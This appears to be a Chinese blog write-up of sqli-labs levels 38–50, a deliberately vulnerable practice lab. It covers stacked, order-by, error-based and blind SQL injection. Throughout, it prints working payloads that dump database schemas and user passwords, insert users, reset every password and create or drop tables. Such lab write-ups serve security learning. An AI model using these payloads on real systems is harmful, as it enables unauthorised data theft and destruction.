        <h1 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3 (Stacked Injections)"></a>Page-3 (Stacked Injections)</h1><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less 38"></a>Less 38</h3><p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># id 参数直接带入到 SQL 语句中</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">if (mysqli_multi_query($con1, $sql)):</span><br><span class="line">    输出查询信息</span><br><span class="line">else:</span><br><span class="line">    print_r(mysqli_error($con1));</span><br></pre></td></tr></table></figure>

<p>由于在这里使用了执行一个或多个sql语句的函数<code>mysqli_multi_query。</code><br>所以可以尝试堆叠注入，堆叠注入就是执行多条SQL语句，通过分割；在实战中，由于正常数据库只会回显出我们想要的结果，所以，堆叠注入在黑盒测试下只能通过模糊测试来进行测试。由于是直接执行多条SQL语句，所以对SQL语句就并无限制，可以通过堆叠注入增删改查等数据库操作。</p>
<p>1.测试注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and false --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131165015307.png" alt="image-20220131165015307"></p>
<p>SQL不成立，结果不显示，所以是单引号字符型注入</p>
<p>2.判断字段数</p>
<p>使用order by 排序，测试字段数量，从第一列开始测试，直至报错，第3列开始异常，所以字段为3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131165317918.png" alt="image-20220131165317918"></p>
<p>3.判断显示位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">//由于id不能为负数，所以该SQL查询不到用户数据 , 返回的结果就只有 联合查询的 1 2 3 这一条数据 , 目的在于方便展示字段显示位置</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131165502120.png" alt="image-20220131165502120"></p>
<p>4.爆数据库，爆表，爆字段数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(schema_name)from information_schema.schemata) --+</span><br><span class="line">//此处的group_concat()，可以将多行数据合并为一行</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131165630612.png" alt="image-20220131165630612"></p>
<p>下一步，根据security数据库，获取其所有表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131165854258.png" alt="image-20220131165854258"></p>
<p>user表为用户表，下一步根据起获取所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131170025861.png" alt="image-20220131170025861"></p>
<p>5.获取账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,&#x27;~&#x27;,password)from users) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131170306242.png" alt="image-20220131170306242"></p>
<p>6.叠加注入</p>
<p>利用mysqli_multi_query()，同时执行多条SQL，实现插入用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;;insert into users(id,username,password)values(20,&#x27;zhangsan&#x27;,&#x27;123&#x27;) --+</span><br></pre></td></tr></table></figure>

<p>最后访问新增的用户id&#x3D;20</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220131170604542.png" alt="image-20220131170604542"></p>
<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less 39"></a>Less 39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>和38一样，堆叠注入，将id参数包裹引号去掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password)values(18,&#x27;zhangsan&#x27;,&#x27;2022&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319103839637.png" alt="image-20220319103839637"></p>
<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less 40"></a>Less 40</h3><p>查看源码</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319104204148.png" alt="image-20220319104204148"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users(id,username,password)values(21,&#x27;hell0&#x27;,&#x27;2022&#x27;)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319104127717.png" alt="image-20220319104127717"></p>
<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less 41"></a>Less 41</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319105532560.png" alt="image-20220319105532560"></p>
<p>整数型堆叠注入，将所有的密码都改成hackbar</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;update users set password = &#x27;hackbar&#x27; where id&gt;0 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319105255757.png" alt="image-20220319105255757"></p>
<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less 42"></a>Less 42</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319105914433.png" alt="image-20220319105914433"></p>
<p>基于24关卡新增post的堆叠：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span>admin<span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;create table keepb1ue like users#</span></span><br></pre></td></tr></table></figure>

<p>创建一个和users同样结构的数据库</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319110252233.png" alt="image-20220319110252233"></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319110214575.png" alt="image-20220319110214575"></p>
<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less 43"></a>Less 43</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319110504633.png" alt="image-20220319110504633"></p>
<p>post 闭合’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=King&amp;login_password=123&#x27;);insert into users(id,username,password)values(22,&#x27;test22&#x27;,&#x27;test22&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319110617450.png" alt="image-20220319110617450"></p>
<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less 44"></a>Less 44</h3><p>与43比较，只是闭合方式改了和去掉了一个打印报错信息的语句。</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319110747139.png" alt="image-20220319110747139"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=King&amp;login_password=123&#x27;;drop table keepb1ue#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319111225695.png" alt="image-20220319111225695"></p>
<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less 45"></a>Less 45</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319111455688.png" alt="image-20220319111455688"></p>
<p>还是’)堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=King&amp;login_password=123&#x27;);insert into users(id,username,password)values(23,&#x27;KB&#x27;,&#x27;KB&#x27;)#</span><br></pre></td></tr></table></figure>

<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less 46"></a>Less 46</h3><p>order by 注入</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319111800441.png" alt="image-20220319111800441"></p>
<p>我们可以通过asc 和desc查看返回数据是否相同来简单判断是否存在order by注入</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319111932874.png" alt="image-20220319111932874"></p>
<p>order by注入有很多种方式进行注入，比如：报错注入、盲注、异或注入。如果达到一定条件还可以联合注入</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319112110532.png" alt="image-20220319112110532"></p>
<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less 47"></a>Less 47</h3><p>闭合方式不同</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319112210881.png" alt="image-20220319112210881"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319112340342.png" alt="image-20220319112340342"></p>
<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less 48"></a>Less 48</h3><p>本关与less-46的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。<br> 可以利用sort&#x3D;rand(true&#x2F;false)进行判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=150)</span><br><span class="line">?sort=rand(ascii(left(database(),1))=178)</span><br><span class="line">?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure>

<p>根据rand(true)和rand(fales)的回显不一样做判断，进行布尔盲注</p>
<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less 49"></a>Less 49</h3><p>与less47很类似，只是没有错误回显<br> 利用延时注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))</span><br></pre></td></tr></table></figure>

<h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less 50"></a>Less 50</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/image-20220319112852218.png" alt="image-20220319112852218"></p>
<p>order by +堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table keepblue like users--+</span><br></pre></td></tr></table></figure>


















      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2022 Qhkk
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
<!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?qhkk";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="qhkk";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log('已挂载github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style>undefined</style><!-- hexo injector body_end end --></body>
</html>